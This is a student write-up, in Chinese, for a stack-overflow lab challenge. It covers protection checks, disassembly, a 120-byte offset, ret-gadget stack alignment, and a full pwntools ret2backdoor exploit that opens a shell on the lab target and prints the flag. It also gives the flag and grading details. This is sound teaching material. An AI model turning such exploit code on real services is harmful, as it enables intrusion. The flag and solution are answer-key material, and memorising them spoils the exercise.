# 栈溢出实验 · 远程靶机 WriteUp（Halloween）

> 面向学生的通关教程：如何在**操作环境（noVNC 桌面）**里，从零攻击远程 pwn 靶机、拿到本地 shell 并读取 flag。
>
> - 靶机（题目内部）：`stack-overflow-lab-web-1 : 70`（socat 暴露的 TCP 服务）
> - 宿主机直连（可选）：`127.0.0.1 : 8096`
> - 目标 flag：`flag{Trick_or_Treat_St4ck_0verfl0w}`
> - 工具：桌面已预装 `pwndbg`、`pwntools`、`gcc`、`vim`、`nc`

---

## 0. 打开操作环境并连接靶机

1. 在实验详情页右侧点击 **靶机环境 → 准备靶机**（靶机会自动接入操作桌面网络），再点击 **启动操作环境** 打开 noVNC 桌面。
2. 在桌面里打开 **终端**，先手动连一下靶机感受交互：

```bash
nc stack-overflow-lab-web-1 70
```

会看到类似输出（提示要「给它一个满意的礼物」）：

```
No candy,No flag
if you want to gets to help you,you must give him a gift that satisfies him
So offer your sincerity
```

> 说明：程序在真正进入危险函数前，会先用 `scanf("%d")` 要一个「礼物」（一个整数），只有答对才会进入含漏洞的函数。

---

## 1. 拿到程序并做基础分析

远程盲打很难，标准做法是**拿到二进制在本地静态分析**。在桌面终端下载题目程序：

```bash
cd ~
wget http://<平台地址>/halloween-pwn -O pwn   # 或从实验「远程靶机实战」任务点里的下载链接获取
chmod +x pwn
```

先看保护：

```bash
pwn checksec pwn
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found     <- 没有 Canary，栈溢出可直接覆盖返回地址
NX:       NX enabled          <- 栈不可执行，不能塞 shellcode，要用 ret2text/ret2backdoor
PIE:      No PIE (0x400000)   <- 地址固定，函数地址可以写死
```

结论：**No Canary + No PIE**，是最经典的「栈溢出覆盖返回地址 → 跳到后门函数」题型。

---

## 2. 定位漏洞点与后门

用 pwndbg（或 objdump）看函数与关键调用：

```bash
gdb -q pwn
pwndbg> info functions
```

关键函数三处：

| 函数 | 地址 | 作用 |
|---|---|---|
| `func` | `0x401196` | **后门**：内部 `system("/bin/sh")` |
| `vulnerable` | `0x4011b9` | **漏洞**：`gets()` 读入到栈上小缓冲区 |
| `main` | `0x4011f4` | 先做「礼物」校验，答对才 `call vulnerable` |

看后门 `func`：

```bash
pwndbg> disassemble func
   0x401196 <func>:   endbr64
   0x40119a <func+4>: push   rbp
   ...
   0x40119e <func+8>: lea    rax,[rip+0xe63]   # 0x402008  -> "/bin/sh"
   0x4011a5:          mov    rdi,rax
   0x4011ad:          call   system@plt        # system("/bin/sh")
```

看漏洞 `vulnerable`：

```bash
pwndbg> disassemble vulnerable
   0x4011b9 <vulnerable>:    endbr64
   0x4011bd:  push rbp
   0x4011be:  mov  rbp,rsp
   0x4011c1:  sub  rsp,0x70          # 缓冲区在 [rbp-0x70]
   ...
   0x4011e0:  call gets@plt          # gets 无长度检查 -> 溢出
```

看 `main` 里的「礼物」校验：

```bash
pwndbg> disassemble main
   ...
   0x401207:  mov  DWORD PTR [rbp-0x4],0x698   # 期望值 0x698 = 1688
   0x401258:  call __isoc99_scanf@plt          # scanf("%d", &gift)
   0x401260:  cmp  DWORD PTR [rbp-0x4],eax      # gift == 0x698 ?
   0x401263:  jne  0x40126f                     # 不等就跳过，不进 vulnerable
   0x40126a:  call vulnerable                   # 相等才进入漏洞函数
```

所以「礼物」= **0x698 = 1688**。

---

## 3. 计算溢出偏移

`vulnerable` 里 `sub rsp,0x70`，缓冲区在 `[rbp-0x70]`。栈布局（从低到高）：

```
[rbp-0x70] ── 缓冲区起点（gets 从这里开始写）
   ...  0x70 = 112 字节 ...
[rbp]      ── 保存的 rbp（8 字节）
[rbp+8]    ── 返回地址   <- 我们要覆盖成后门地址
```

从输入起点到返回地址的偏移：

```
0x70 (缓冲区) + 8 (saved rbp) = 0x78 = 120 字节
```

> 想自己验证偏移，可用 pwntools 的 `cyclic`：
> ```python
> from pwn import *
> p = process('./pwn'); p.sendline(b'1688' + cyclic(200))
> p.wait()
> core = p.corefile
> print(cyclic_find(core.read(core.rsp, 8)))   # 得到 120
> ```

---

## 4. 关键坑：栈对齐（movaps）

64 位下 glibc 的 `system` 内部有 `movaps` 指令，要求调用时 `rsp` 16 字节对齐，否则 **SIGSEGV**。直接跳到 `func` 起点常常差 8 字节。

解决办法：在返回地址前多垫一个 **`ret` 小工具**（只执行一条 `ret`，把栈指针再抬 8 字节对齐）。程序里现成的 `ret`：

```
0x4011b8 : ret      # func 末尾的 ret，可当对齐 gadget
```

即返回地址链变成：`ret(0x4011b8) → func(0x401196)`。

---

## 5. 另一个坑：scanf 与 gets 的「残留换行」

`scanf("%d")` 读完数字后，会把后面的换行 `\n` **留在输入缓冲区**。如果你分两次发送（先发 `1688\n`，再发 payload），`gets` 会先读到那个残留的空行 → 读到空串，payload 根本没进 `gets`，攻击失败。

**正确做法：把礼物和 payload 拼成一行发送**——`scanf` 读到 `1688` 遇到非数字 `a` 停止，`gets` 紧接着读同一行剩下的溢出数据：

```python
payload = b"1688" + b"a"*120 + p64(ret) + p64(func)
io.sendline(payload)   # 一整行
```

---

## 6. 完整 exp

在桌面用 `vim exp.py` 写入（连题目内部容器名，也可改成宿主 `remote('127.0.0.1', 8096)`）：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')

# io = process('./pwn')                          # 本地调试
io = remote('stack-overflow-lab-web-1', 70)      # 远程靶机（操作环境内）

FUNC = 0x401196     # 后门 func: system("/bin/sh")
RET  = 0x4011b8     # ret 对齐 gadget
GIFT = b"1688"      # scanf 校验的礼物 0x698

payload  = GIFT              # 满足 scanf("%d") == 0x698
payload += b"a" * 120        # 填满缓冲区(0x70) + saved rbp(8) = 120
payload += p64(RET)          # 栈对齐
payload += p64(FUNC)         # 覆盖返回地址 -> 后门

io.sendline(payload)
io.interactive()             # 拿到 shell 后手动操作
```

---

## 7. getshell 并读取 flag

```bash
python3 exp.py
```

进入 shell 后（提示符可能不显示，直接输命令即可）：

```bash
$ ls
exp.py  flag  pwn  vuln
$ cat flag
flag{Trick_or_Treat_St4ck_0verfl0w}
```

拿到 flag！

> 如果你懒得手动敲命令，也可以把 exp 最后两行改成：
> ```python
> io.sendline(b"cat flag")
> print(io.recvline_contains(b"flag"))
> ```

---

## 8. 提交 flag

回到实验详情页 **任务点「远程靶机实战」**，把 `flag{Trick_or_Treat_St4ck_0verfl0w}` 填进去提交。后端会校验：正确即判定该实验完成（40 分）。

> 提交前需先点过「准备靶机」——它会建立靶机会话，Flag 才能被校验。

---

## 小结（攻击链）

```
连接靶机 → 拿二进制静态分析(checksec/pwndbg)
        → 找到 gets 溢出点 + system("/bin/sh") 后门 + scanf 礼物校验(1688)
        → 算偏移(0x70+8=120) → 处理 movaps 栈对齐(垫 ret)
        → 一行发送 "1688"+padding+ret+func → getshell → cat flag → 提交
```

对应知识点：栈帧结构、返回地址覆盖、ret2text/ret2backdoor、NX/Canary/PIE 保护、64 位栈对齐、scanf/gets 输入残留。
